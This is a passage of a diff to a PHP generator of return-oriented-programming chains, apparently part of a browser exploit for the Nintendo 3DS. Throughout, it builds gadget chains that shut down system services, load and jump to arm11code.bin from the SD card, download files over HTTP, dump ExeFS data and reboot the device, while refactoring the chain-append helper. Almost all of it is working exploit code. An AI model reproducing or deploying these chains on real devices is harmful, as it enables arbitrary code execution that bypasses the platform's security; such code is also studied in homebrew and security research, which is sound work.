+	ropchain_appendu32($POPLRPC);
 
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+	ropchain_appendu32($POPPC);//lr
+	ropchain_appendu32($ROP_POP_R1R5PC);
 
-	$ROPCHAIN.= genu32_unicode($FD_ADDR);//r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode($ROP_STR_R0TOR1);//Write the out fd from wkc_fopen() to $FD_ADDR.
+	ropchain_appendu32($FD_ADDR);//r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32($ROP_STR_R0TOR1);//Write the out fd from wkc_fopen() to $FD_ADDR.
 
 	ropgen_ldm_r0r3($FD_ADDR, $curlstate+8);//Copy the fd from $FD_ADDR to $curlstate+8(0x10-bytes are copied with this).
 	ropgen_writeu32($curlstate+4, 10000 + 1, 0, 1);//type
 
-	//$ROPCHAIN.= genu32_unicode(0x50505050);
+	//ropchain_appendu32(0x50505050);
 
 	ropgen_curl_easy_init($curlstate);
 	ropgen_curl_easy_setopt($curlstate, 10000 + 1, 0, 0);//Set the CURL FILE OPT("CURLOPT_WRITEDATA") to the fd which was copied to $curlstate+8.
@@ -1306,8 +1324,8 @@ function ropgen_httpdownload($bufaddr, $bufsize, $filepath, $url, $delete_tmpfil
 
 		ropgen_ldm_r0r3($FD_ADDR, 0);
 
-		$ROPCHAIN.= genu32_unicode($POPPC);//lr
-		$ROPCHAIN.= genu32_unicode($WKC_FSEEK);//wkc_fseek(fd, 0, SEEK_SET)
+		ropchain_appendu32($POPPC);//lr
+		ropchain_appendu32($WKC_FSEEK);//wkc_fseek(fd, 0, SEEK_SET)
 
 		ropgen_writeu32($FD_ADDR-12, $bufaddr, 0, 1);//ptr
 		ropgen_writeu32($FD_ADDR-8, 0x1, 0, 1);//size
@@ -1315,8 +1333,8 @@ function ropgen_httpdownload($bufaddr, $bufsize, $filepath, $url, $delete_tmpfil
 
 		ropgen_ldm_r0r3($FD_ADDR-12, 0);
 
-		$ROPCHAIN.= genu32_unicode($POPPC);//lr
-		$ROPCHAIN.= genu32_unicode($WKC_FREAD);//wkc_fread($bufaddr, 1, $bufsize, fd)
+		ropchain_appendu32($POPPC);//lr
+		ropchain_appendu32($WKC_FREAD);//wkc_fread($bufaddr, 1, $bufsize, fd)
 	}
 
 	if($delete_tmpfile)
@@ -1328,8 +1346,8 @@ function ropgen_httpdownload($bufaddr, $bufsize, $filepath, $url, $delete_tmpfil
 
 		ropgen_ldm_r0r3($FD_ADDR, 0);
 
-		$ROPCHAIN.= genu32_unicode($POPPC);//lr
-		$ROPCHAIN.= genu32_unicode($WKC_FSEEK);//wkc_fseek(fd, 0, SEEK_SET)
+		ropchain_appendu32($POPPC);//lr
+		ropchain_appendu32($WKC_FSEEK);//wkc_fseek(fd, 0, SEEK_SET)
 
 		$chunksize = 0x8000;
 
@@ -1343,17 +1361,17 @@ function ropgen_httpdownload($bufaddr, $bufsize, $filepath, $url, $delete_tmpfil
 
 			ropgen_ldm_r0r3($FD_ADDR-12, 0);
 
-			$ROPCHAIN.= genu32_unicode($POPPC);//lr
-			$ROPCHAIN.= genu32_unicode($WKC_FWRITE);//wkc_fwrite($bufaddr, 1, $bufsize, fd)
+			ropchain_appendu32($POPPC);//lr
+			ropchain_appendu32($WKC_FWRITE);//wkc_fwrite($bufaddr, 1, $bufsize, fd)
 		}
 	}
 
 	ropgen_ldm_r0r3($FD_ADDR, 0);
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
+	ropchain_appendu32($POPLRPC);
 
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($WKC_FCLOSE);
+	ropchain_appendu32($POPPC);//lr
+	ropchain_appendu32($WKC_FCLOSE);
 
 	if($delete_tmpfile)ropgen_callfunc($filepathptr_utf16, 0x0, 0x0, 0x0, $POPPC, $FS_DELETEFILE);
 }
@@ -1434,10 +1452,10 @@ function string_gendata_array($inputstr, $utf16_out, $size)
 
 function generateropchain_type1()
 {
-	global $ROPHEAP, $ROPCHAIN, $ROP_INFINITELP, $POPPC, $POPLRPC, $ROP_POP_R0R6PC, $ROP_POP_R0R8PC, $ROP_STR_R1TOR0, $ROP_POP_R0PC, $SRVPORT_HANDLEADR, $srv_shutdown, $svcGetProcessId, $srv_GetServiceHandle, $srvpm_initialize, $SRV_REFCNT, $ROP_MEMSETOTHER, $DIFF_FILEREAD_FUNCPTR, $ARM9_HEAPHAXBUF;
+	global $ROPHEAP, $ROP_INFINITELP, $POPPC, $POPLRPC, $ROP_POP_R0R6PC, $ROP_POP_R0R8PC, $ROP_STR_R1TOR0, $ROP_POP_R0PC, $SRVPORT_HANDLEADR, $srv_shutdown, $svcGetProcessId, $srv_GetServiceHandle, $srvpm_initialize, $SRV_REFCNT, $ROP_MEMSETOTHER, $DIFF_FILEREAD_FUNCPTR, $ARM9_HEAPHAXBUF;
 
-	//$ROPCHAIN.= genu32_unicode(0x40404040);
-	//$ROPCHAIN.= genu32_unicode(0x80808080);
+	//ropchain_appendu32(0x40404040);
+	//ropchain_appendu32(0x80808080);
 
 	ropgen_writeu32($SRV_REFCNT, 1, 0, 1);//Set the srv reference counter to value 1, so that the below function calls do the actual srv shutdown and "srv:pm" initialization.
 
@@ -1549,12 +1567,12 @@ function generateropchain_type1()
 
 	ropgen_sendcmd($ROPHEAP+0xc, 0);//ReloadDBS, for SD card.
 
-	$ROPCHAIN.= genu32_unicode(0x50505050);//genu32_unicode($ROP_INFINITELP);
+	ropchain_appendu32(0x50505050);//genu32_unicode($ROP_INFINITELP);
 }
 
 function generateropchain_type2()
 {
-	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver, $FS_MOUNTSDMC;
+	global $ROPHEAP, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver, $FS_MOUNTSDMC;
 
 	$LINEAR_TMPBUF = 0x18B40000;
 	$LINEAR_VADDRBASE = 0x14000000;
@@ -1587,27 +1605,27 @@ function generateropchain_type2()
 
 	if($browserver>=0x80)
 	{
-		$ROPCHAIN.= genu32_unicode($POPLRPC);
-		$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
+		ropchain_appendu32($POPLRPC);
+		ropchain_appendu32($ROP_POP_R0R6PC);
 
-		$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
-		$ROPCHAIN.= genu32_unicode($ROPHEAP);//r0 outaddr
-		$ROPCHAIN.= genu32_unicode(0x0a000000);//r1 addr0
-		$ROPCHAIN.= genu32_unicode(0x0);//r2 addr1
-		$ROPCHAIN.= genu32_unicode(0x800000);//r3 size
-		$ROPCHAIN.= genu32_unicode(0x0);//r4
-		$ROPCHAIN.= genu32_unicode(0x0);//r5
-		$ROPCHAIN.= genu32_unicode(0x0);//r6
+		ropchain_appendu32($ROP_POP_R0R6PC);
+		ropchain_appendu32($ROPHEAP);//r0 outaddr
+		ropchain_appendu32(0x0a000000);//r1 addr0
+		ropchain_appendu32(0x0);//r2 addr1
+		ropchain_appendu32(0x800000);//r3 size
+		ropchain_appendu32(0x0);//r4
+		ropchain_appendu32(0x0);//r5
+		ropchain_appendu32(0x0);//r6
 
-		$ROPCHAIN.= genu32_unicode($svcControlMemory);//Free 8MB of heap under SKATER.
+		ropchain_appendu32($svcControlMemory);//Free 8MB of heap under SKATER.
 
-		$ROPCHAIN.= genu32_unicode(0x1);//sp0 operation
-		$ROPCHAIN.= genu32_unicode(0x0);//sp4 permissions
-		$ROPCHAIN.= genu32_unicode(0x0);//sp8
-		$ROPCHAIN.= genu32_unicode(0x8);//sp12
-		$ROPCHAIN.= genu32_unicode(0x0);//r4
-		$ROPCHAIN.= genu32_unicode(0x0);//r5
-		$ROPCHAIN.= genu32_unicode(0x0);//r6
+		ropchain_appendu32(0x1);//sp0 operation
+		ropchain_appendu32(0x0);//sp4 permissions
+		ropchain_appendu32(0x0);//sp8
+		ropchain_appendu32(0x8);//sp12
+		ropchain_appendu32(0x0);//r4
+		ropchain_appendu32(0x0);//r5
+		ropchain_appendu32(0x0);//r6
 	}
 
 	if($arm11code_loadfromsd==0)
@@ -1637,25 +1655,25 @@ function generateropchain_type2()
 		ropgen_writeregdata_wrap($ROPHEAP+0x40, $databuf, 0, 0x28);//Write the following utf16 string to ROPHEAP+0x40: "sdmc:/arm11code.bin".
 
 		ropgen_callfunc($IFile_ctx, $ROPHEAP+0x40, 0x1, 0x0, $POPPC, $IFile_Open);//Open the above file.
-		//$ROPCHAIN.= genu32_unicode(0x50505050);
+		//ropchain_appendu32(0x50505050);
 		ropgen_condfatalerr();
 
 		ropgen_callfunc($IFile_ctx, $ROPHEAP+0x20, $LINEAR_CODETMPBUF, 0x10000, $POPPC, $IFile_Read);//Read the file to $LINEAR_CODETMPBUF with size 0x10000, actual size must be <=0x10000.
-		//$ROPCHAIN.= genu32_unicode(0x40404040);
+		//ropchain_appendu32(0x40404040);
 		ropgen_condfatalerr();
 
 		ropgen_readu32($IFile_ctx, 0, 1);
 
-		$ROPCHAIN.= genu32_unicode($POPLRPC);
-		$ROPCHAIN.= genu32_unicode($POPPC);//lr
-		$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+		ropchain_appendu32($POPLRPC);
+		ropchain_appendu32($POPPC);//lr
+		ropchain_appendu32($ROP_POP_R1R5PC);
 
-		$ROPCHAIN.= genu32_unicode(0x0);//r1
-		$ROPCHAIN.= genu32_unicode(0x0);//r2
-		$ROPCHAIN.= genu32_unicode(0x0);//r3
-		$ROPCHAIN.= genu32_unicode(0x0);//r4
-		$ROPCHAIN.= genu32_unicode(0x0);//r5
-		$ROPCHAIN.= genu32_unicode($IFile_Close);
+		ropchain_appendu32(0x0);//r1
+		ropchain_appendu32(0x0);//r2
+		ropchain_appendu32(0x0);//r3
+		ropchain_appendu32(0x0);//r4
+		ropchain_appendu32(0x0);//r5
+		ropchain_appendu32($IFile_Close);
 	}
 	else if($arm11code_loadfromsd==2)
 	{
@@ -1694,64 +1712,64 @@ function generateropchain_type2()
 	$databuf[25] = $LINEAR_CODETMPBUF;
 	ropgen_writeregdata_wrap($LINEAR_TMPBUF, $databuf, 0, 26*4);
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
+	ropchain_appendu32($POPLRPC);
+	ropchain_appendu32($ROP_POP_R0R6PC);
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
-	$ROPCHAIN.= genu32_unicode($LINEAR_CODETMPBUF);//r0 srcaddr
-	$ROPCHAIN.= genu32_unicode($LINEARADR_CODESTART);//r1 dstaddr
-	$ROPCHAIN.= genu32_unicode(0x10000);//r2 size
-	$ROPCHAIN.= genu32_unicode(0x0);//r3 width0
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32($ROP_POP_R0R6PC);
+	ropchain_appendu32($LINEAR_CODETMPBUF);//r0 srcaddr
+	ropchain_appendu32($LINEARADR_CODESTART);//r1 dstaddr
+	ropchain_appendu32(0x10000);//r2 size
+	ropchain_appendu32(0x0);//r3 width0
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32(0x0);//r6
 
-	$ROPCHAIN.= genu32_unicode($GXLOW_CMD4);//Copy the loaded code to the start of the CRO.
+	ropchain_appendu32($GXLOW_CMD4);//Copy the loaded code to the start of the CRO.
 
-	$ROPCHAIN.= genu32_unicode(0x0);//sp0 height0
-	$ROPCHAIN.= genu32_unicode(0x0);//sp4 width1
-	$ROPCHAIN.= genu32_unicode(0x0);//sp8 height1
-	$ROPCHAIN.= genu32_unicode(0x8);//sp12 flags 
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32(0x0);//sp0 height0
+	ropchain_appendu32(0x0);//sp4 width1
+	ropchain_appendu32(0x0);//sp8 height1
+	ropchain_appendu32(0x8);//sp12 flags 
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32(0x0);//r6
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);//Delay 1 second while the above copy-command is being processed, then jump to that code.
-	$ROPCHAIN.= genu32_unicode($POPPC);
+	ropchain_appendu32($POPLRPC);//Delay 1 second while the above copy-command is being processed, then jump to that code.
+	ropchain_appendu32($POPPC);
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
-	$ROPCHAIN.= genu32_unicode(1000000000);//r0
-	$ROPCHAIN.= genu32_unicode(0x0);//r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32($ROP_POP_R0R6PC);
+	ropchain_appendu32(1000000000);//r0
+	ropchain_appendu32(0x0);//r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32(0x0);//r6
 
-	$ROPCHAIN.= genu32_unicode($svcSleepThread);
+	ropchain_appendu32($svcSleepThread);
 
 	ropgen_writeu32($ROPHEAP, 0x01FFFFFF, 0, 1);
 	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $ROP_POP_R0R6PC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that white is displayed.
 
-	$ROPCHAIN.= genu32_unicode($LINEAR_TMPBUF);//r0
-	$ROPCHAIN.= genu32_unicode(0x0);//r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32($LINEAR_TMPBUF);//r0
+	ropchain_appendu32(0x0);//r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32(0x0);//r6
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($POPPC);
+	ropchain_appendu32($POPLRPC);
+	ropchain_appendu32($POPPC);
 
-	$ROPCHAIN.= genu32_unicode($CODESTART_MAPADR);
+	ropchain_appendu32($CODESTART_MAPADR);
 
-	$ROPCHAIN.= genu32_unicode(0x70707070);
+	ropchain_appendu32(0x70707070);
 }
 
 function generateropchain_type3()
 {
-	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $READ_EXEFSFILE, $OPENFILEDIRECTLY_WRAP, $FSFILEIPC_CLOSE, $FSFILEIPC_GETSIZE, $FSFILEIPC_READ, $GSP_WRITEHWREGS, $browserver, $arm11code_loadfromsd, $FS_MOUNTSDMC;
+	global $ROPHEAP, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $READ_EXEFSFILE, $OPENFILEDIRECTLY_WRAP, $FSFILEIPC_CLOSE, $FSFILEIPC_GETSIZE, $FSFILEIPC_READ, $GSP_WRITEHWREGS, $browserver, $arm11code_loadfromsd, $FS_MOUNTSDMC;
 
 	$IFile_ctx = $ROPHEAP+0x80;
 	$FILEBUF = 0x18B40000;
@@ -1806,52 +1824,52 @@ function generateropchain_type3()
 
 	ropgen_callfunc($ROPHEAP+0xc0, 0x2345678A, $ROPHEAP+0x100+0x44, $ROPHEAP+0x100+0x44+0xc, $POPPC, $OPENFILEDIRECTLY_WRAP);
 
-	/*$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+	/*ropchain_appendu32($POPLRPC);
+	ropchain_appendu32($ROP_POP_R1R5PC);
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
-	$ROPCHAIN.= genu32_unicode($FILEBUF);//r0 outbuf*
-	$ROPCHAIN.= genu32_unicode(0x000e8000);//r1 readsize
-	$ROPCHAIN.= genu32_unicode(0x2);//r2 archive lowpathtype
-	$ROPCHAIN.= genu32_unicode($ROPHEAP+0x100+0x20);//r3 archive lowpath data*
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32($ROP_POP_R0R6PC);
+	ropchain_appendu32($FILEBUF);//r0 outbuf*
+	ropchain_appendu32(0x000e8000);//r1 readsize
+	ropchain_appendu32(0x2);//r2 archive lowpathtype
+	ropchain_appendu32($ROPHEAP+0x100+0x20);//r3 archive lowpath data*
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32(0x0);//r6
 
-	$ROPCHAIN.= genu32_unicode($READ_EXEFSFILE);//Write the data @ $FILEBUF to the file.
+	ropchain_appendu32($READ_EXEFSFILE);//Write the data @ $FILEBUF to the file.
 
-	$ROPCHAIN.= genu32_unicode(0x10);//sp0(archive lowpath datasize) / r1
-	$ROPCHAIN.= genu32_unicode($ROPHEAP+0x100+0x20+0x10);//sp4(ptr to 8-byte exefs filename) / r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x8);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5*/
+	ropchain_appendu32(0x10);//sp0(archive lowpath datasize) / r1
+	ropchain_appendu32($ROPHEAP+0x100+0x20+0x10);//sp4(ptr to 8-byte exefs filename) / r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32(0x8);//r4
+	ropchain_appendu32(0x0);//r5*/
 
-	//$ROPCHAIN.= genu32_unicode(0x24242424);
+	//ropchain_appendu32(0x24242424);
 	ropgen_condfatalerr();
 
 	ropgen_callfunc($ROPHEAP+0xc0, $FILEBUF, 0x0, 0x0, $POPPC, $FSFILEIPC_GETSIZE);//Load the filesize to $FILEBUF+0.
 
-	//$ROPCHAIN.= genu32_unicode(0x34343434);
+	//ropchain_appendu32(0x34343434);
 	ropgen_condfatalerr();
 
 	ropgen_writeu32($FILEBUF-4, $FILEBUF+8, 0, 1);
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
-	$ROPCHAIN.= genu32_unicode($ROPHEAP+0xc0);//r0 handle*
-	$ROPCHAIN.= genu32_unicode(0x0);//r1 unused
-	$ROPCHAIN.= genu32_unicode(0x0);//r2 offset low
-	$ROPCHAIN.= genu32_unicode(0x0);//r3 offset high
-	$ROPCHAIN.= genu32_unicode($FILEBUF-4);//r4 ptr to the following: +0 = databuf, +4 = datasize
-	$ROPCHAIN.= genu32_unicode($ROPHEAP+0xd0);//r5 transfercount*
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32($ROP_POP_R0R6PC);
+	ropchain_appendu32($ROPHEAP+0xc0);//r0 handle*
+	ropchain_appendu32(0x0);//r1 unused
+	ropchain_appendu32(0x0);//r2 offset low
+	ropchain_appendu32(0x0);//r3 offset high
+	ropchain_appendu32($FILEBUF-4);//r4 ptr to the following: +0 = databuf, +4 = datasize
+	ropchain_appendu32($ROPHEAP+0xd0);//r5 transfercount*
+	ropchain_appendu32(0x0);//r6
 
-	$ROPCHAIN.= genu32_unicode($FSFILEIPC_READ+0xc);
+	ropchain_appendu32($FSFILEIPC_READ+0xc);
 
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32(0x0);//r6
 
-	//$ROPCHAIN.= genu32_unicode(0x74747474);
+	//ropchain_appendu32(0x74747474);
 	ropgen_condfatalerr();
 
 	ropgen_callfunc($ROPHEAP+0xc0, 0x0, 0x0, 0x0, $POPPC, $FSFILEIPC_CLOSE);
@@ -1859,53 +1877,53 @@ function generateropchain_type3()
 	ropgen_callfunc($IFile_ctx, $ROPHEAP+0x100, 0x6, 0x0, $POPPC, $IFile_Open);//Open the above file for writing.
 	ropgen_condfatalerr();
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+	ropchain_appendu32($POPLRPC);
+	ropchain_appendu32($ROP_POP_R1R5PC);
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
-	$ROPCHAIN.= genu32_unicode($IFile_ctx);//r0 filectx
-	$ROPCHAIN.= genu32_unicode($ROPHEAP+0x20);//r1 transfercount*
-	$ROPCHAIN.= genu32_unicode($FILEBUF);//r2 buf*
-	$ROPCHAIN.= genu32_unicode(0x00200000+8);//r3 size
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32($ROP_POP_R0R6PC);
+	ropchain_appendu32($IFile_ctx);//r0 filectx
+	ropchain_appendu32($ROPHEAP+0x20);//r1 transfercount*
+	ropchain_appendu32($FILEBUF);//r2 buf*
+	ropchain_appendu32(0x00200000+8);//r3 size
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32(0x0);//r6
 
-	$ROPCHAIN.= genu32_unicode($IFile_Write);//Write the data @ $FILEBUF to the file.
+	ropchain_appendu32($IFile_Write);//Write the data @ $FILEBUF to the file.
 
-	$ROPCHAIN.= genu32_unicode(0x1);//sp0(flushflag) / r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x8);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
+	ropchain_appendu32(0x1);//sp0(flushflag) / r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32(0x8);//r4
+	ropchain_appendu32(0x0);//r5
 
 	ropgen_condfatalerr();
 
 	ropgen_readu32($IFile_ctx, 0, 1);
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+	ropchain_appendu32($POPLRPC);
+	ropchain_appendu32($POPPC);//lr
+	ropchain_appendu32($ROP_POP_R1R5PC);
 
-	$ROPCHAIN.= genu32_unicode(0x0);//r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode($IFile_Close);
+	ropchain_appendu32(0x0);//r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32($IFile_Close);
 
 	ropgen_writeu32($ROPHEAP, 0x01FF0000, 0, 1);
 	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that blue is displayed.
 
-	$ROPCHAIN.= genu32_unicode(0x70707070);
+	ropchain_appendu32(0x70707070);
 }
 
 function generateropchain_type4()
 {
-	global $ROPHEAP, $ROPCHAIN, $ROP_INFINITELP, $POPPC, $POPLRPC, $ROP_POP_R0R6PC, $ROP_POP_R0R8PC, $ROP_STR_R1TOR0, $ROP_POP_R0PC, $SRVPORT_HANDLEADR, $srv_shutdown, $svcGetProcessId, $srv_GetServiceHandle, $srvpm_initialize, $SRV_REFCNT, $ROP_MEMSETOTHER;
+	global $ROPHEAP, $ROP_INFINITELP, $POPPC, $POPLRPC, $ROP_POP_R0R6PC, $ROP_POP_R0R8PC, $ROP_STR_R1TOR0, $ROP_POP_R0PC, $SRVPORT_HANDLEADR, $srv_shutdown, $svcGetProcessId, $srv_GetServiceHandle, $srvpm_initialize, $SRV_REFCNT, $ROP_MEMSETOTHER;
 
-	//$ROPCHAIN.= genu32_unicode(0x40404040);
-	//$ROPCHAIN.= genu32_unicode(0x80808080);
+	//ropchain_appendu32(0x40404040);
+	//ropchain_appendu32(0x80808080);
 
 	ropgen_writeu32($SRV_REFCNT, 1, 0, 1);//Set the srv reference counter to value 1, so that the below function calls do the actual srv shutdown and "srv:pm" initialization.
 
@@ -1970,7 +1988,7 @@ function generateropchain_type4()
 
 	ropgen_sendcmd($ROPHEAP+0xc, 0);//NSS:RebootSystem
 
-	$ROPCHAIN.= genu32_unicode(0x50505050);
+	ropchain_appendu32(0x50505050);
 }
 
 ?>
